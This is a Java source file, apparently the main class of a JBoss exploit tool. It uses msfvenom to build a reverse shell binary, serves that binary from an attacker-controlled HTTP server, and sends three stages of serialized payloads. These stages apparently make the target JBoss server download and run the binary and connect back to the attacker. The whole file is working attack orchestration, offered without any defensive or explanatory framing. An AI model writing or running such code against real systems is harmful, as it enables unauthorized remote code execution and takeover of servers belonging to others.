package jbossexploit;

import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.Options;

public class Main {

    public static void main(String[] args) {
        String binaryName = Msfvenom.generateBinaryName();

        // Parse arguments
        CommandLine cmd = parseArguments(args);
        String rhost = cmd.getOptionValue("rhost");
        int rport = Integer.parseInt(cmd.getOptionValue("rport"));
        String lhost = cmd.getOptionValue("lhost");
        int hport = Integer.parseInt(cmd.getOptionValue("hport"));
        int wport = Integer.parseInt(cmd.getOptionValue("wport"));

        System.out.println("Generating reverse shell binary with msfvenom at /tmp/" + binaryName + "...");
        Msfvenom.generateBinary(lhost, hport, binaryName);

        System.out.println("Starting HTTP Server...");
        hostFile(wport);

        System.out.println("Sending serialized commands...");
        int stage;
        for (stage = 0; stage < 3; stage++) {
            System.out.println("Sending stage " + stage);
            Stager.sendPayload(stage, rhost, rport, lhost, wport, binaryName);
        }
    }

    public static CommandLine parseArguments(String[] args) {
        Options options = new Options();

        // Set up CLI options
        options.addOption("rhost", true, "Target Host IP");
        options.addOption("rport", true, "Remote JBoss Port");
        options.addOption("lhost", true, "Local IP for Target to Connect To");
        options.addOption("hport", true, "Local Handler Port for MSF Handler");
        options.addOption("wport", true, "Local Port for HTTP Server");

        CommandLineParser parser = new DefaultParser();
        CommandLine cmd = null;
        try {
            cmd = parser.parse(options, args);
        } catch (Exception e) {
            System.out.println("Error parsing arguments.");
            System.exit(1);
        }

        return cmd;
    }

    public static void hostFile(int wport) {
        final int port = wport;
        final HttpFileServer server = new HttpFileServer();

        new Thread() {
            @Override
            public void run() {
                try {
                    server.main(port);
                } catch (Exception e) {
                    System.out.println("Could not start HTTP Server.");
                    System.exit(1);
                }
            }
        }.start();
    }
}
